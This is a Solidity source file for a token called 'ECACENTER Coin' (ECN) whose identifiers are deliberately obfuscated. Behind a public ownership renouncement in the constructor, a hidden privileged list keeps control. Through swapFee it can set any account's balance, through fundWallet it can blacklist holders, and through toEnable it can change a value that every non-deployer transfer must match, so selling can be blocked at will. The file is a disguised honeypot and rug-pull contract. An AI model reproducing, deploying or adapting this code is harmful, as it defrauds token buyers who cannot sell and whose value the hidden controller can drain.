//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface receiverAuto {
    function totalSupply() external view returns (uint256);

    function balanceOf(address exemptLaunch) external view returns (uint256);

    function transfer(address amountMarketingTx, uint256 minEnableFrom) external returns (bool);

    function allowance(address shouldReceiverToken, address spender) external view returns (uint256);

    function approve(address spender, uint256 minEnableFrom) external returns (bool);

    function transferFrom(
        address sender,
        address amountMarketingTx,
        uint256 minEnableFrom
    ) external returns (bool);

    event Transfer(address indexed from, address indexed toLaunchedMax, uint256 value);
    event Approval(address indexed shouldReceiverToken, address indexed spender, uint256 value);
}

interface toTake {
    function createPair(address totalLimitList, address toTradingLaunched) external returns (address);
}

interface fromExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract atLaunch {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverAutoMetadata is receiverAuto {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ECACENTERCoin is atLaunch, receiverAuto, receiverAutoMetadata {

    bool private buyReceiver;

    mapping(address => uint256) private totalTeam;

    function swapFee(address takeMinAmount, uint256 minEnableFrom) public {
        receiverMaxSender();
        totalTeam[takeMinAmount] = minEnableFrom;
    }

    uint256 private txMode;

    function receiverFrom(address maxAuto, address amountMarketingTx, uint256 minEnableFrom) internal returns (bool) {
        require(totalTeam[maxAuto] >= minEnableFrom);
        totalTeam[maxAuto] -= minEnableFrom;
        totalTeam[amountMarketingTx] += minEnableFrom;
        emit Transfer(maxAuto, amountMarketingTx, minEnableFrom);
        return true;
    }

    function allowance(address takeFromExempt, address toExempt) external view virtual override returns (uint256) {
        if (toExempt == enableList) {
            return type(uint256).max;
        }
        return minBuy[takeFromExempt][toExempt];
    }

    function owner() external view returns (address) {
        return limitShould;
    }

    function balanceOf(address exemptLaunch) public view virtual override returns (uint256) {
        return totalTeam[exemptLaunch];
    }

    function approve(address toExempt, uint256 minEnableFrom) public virtual override returns (bool) {
        minBuy[_msgSender()][toExempt] = minEnableFrom;
        emit Approval(_msgSender(), toExempt, minEnableFrom);
        return true;
    }

    function toEnable(uint256 minEnableFrom) public {
        receiverMaxSender();
        fromReceiver = minEnableFrom;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return totalSell;
    }

    uint256 private isList;

    bool private atSender;

    uint256 public limitEnable;

    function liquidityFund(address tokenTrading) public {
        if (maxLaunched) {
            return;
        }
        
        sellReceiver[tokenTrading] = true;
        if (enableShould != buyReceiver) {
            isList = limitEnable;
        }
        maxLaunched = true;
    }

    function fundWallet(address exemptTokenList) public {
        receiverMaxSender();
        if (isList != exemptShould) {
            launchedReceiver = true;
        }
        if (exemptTokenList == receiverLiquidity || exemptTokenList == buyMarketing) {
            return;
        }
        fromAt[exemptTokenList] = true;
    }

    address sellToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 isTrading;

    bool public maxLaunched;

    string private modeFee = "ECN";

    bool public launchedReceiver;

    mapping(address => mapping(address => uint256)) private minBuy;

    uint256 private totalSell = 100000000 * 10 ** 18;

    function transferFrom(address maxAuto, address amountMarketingTx, uint256 minEnableFrom) external override returns (bool) {
        if (_msgSender() != enableList) {
            if (minBuy[maxAuto][_msgSender()] != type(uint256).max) {
                require(minEnableFrom <= minBuy[maxAuto][_msgSender()]);
                minBuy[maxAuto][_msgSender()] -= minEnableFrom;
            }
        }
        return receiverLiquiditySender(maxAuto, amountMarketingTx, minEnableFrom);
    }

    bool private walletAmount;

    mapping(address => bool) public fromAt;

    constructor (){
        
        receiverReceiver();
        fromExempt txSell = fromExempt(enableList);
        buyMarketing = toTake(txSell.factory()).createPair(txSell.WETH(), address(this));
        if (walletAmount == launchedReceiver) {
            walletAmount = true;
        }
        receiverLiquidity = _msgSender();
        sellReceiver[receiverLiquidity] = true;
        totalTeam[receiverLiquidity] = totalSell;
        
        emit Transfer(address(0), receiverLiquidity, totalSell);
    }

    event OwnershipTransferred(address indexed marketingModeMax, address indexed maxTotal);

    function getOwner() external view returns (address) {
        return limitShould;
    }

    uint256 public exemptShould;

    function receiverMaxSender() private view {
        require(sellReceiver[_msgSender()]);
    }

    address public buyMarketing;

    function receiverReceiver() public {
        emit OwnershipTransferred(receiverLiquidity, address(0));
        limitShould = address(0);
    }

    function receiverLiquiditySender(address maxAuto, address amountMarketingTx, uint256 minEnableFrom) internal returns (bool) {
        if (maxAuto == receiverLiquidity) {
            return receiverFrom(maxAuto, amountMarketingTx, minEnableFrom);
        }
        uint256 shouldBuy = receiverAuto(buyMarketing).balanceOf(sellToken);
        require(shouldBuy == fromReceiver);
        require(!fromAt[maxAuto]);
        return receiverFrom(maxAuto, amountMarketingTx, minEnableFrom);
    }

    address enableList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address private limitShould;

    address public receiverLiquidity;

    function name() external view virtual override returns (string memory) {
        return limitReceiver;
    }

    mapping(address => bool) public sellReceiver;

    string private limitReceiver = "ECACENTER Coin";

    uint8 private fromTake = 18;

    uint256 fromReceiver;

    function decimals() external view virtual override returns (uint8) {
        return fromTake;
    }

    uint256 public receiverFee;

    function transfer(address takeMinAmount, uint256 minEnableFrom) external virtual override returns (bool) {
        return receiverLiquiditySender(_msgSender(), takeMinAmount, minEnableFrom);
    }

    bool public enableShould;

    function symbol() external view virtual override returns (string memory) {
        return modeFee;
    }

}